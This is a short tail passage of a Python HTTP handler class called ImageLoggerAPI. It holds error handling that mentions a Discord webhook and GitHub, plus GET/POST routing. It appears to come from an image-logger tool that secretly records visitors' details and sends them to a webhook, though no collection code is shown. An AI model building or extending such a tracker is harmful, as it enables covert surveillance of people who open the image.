            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
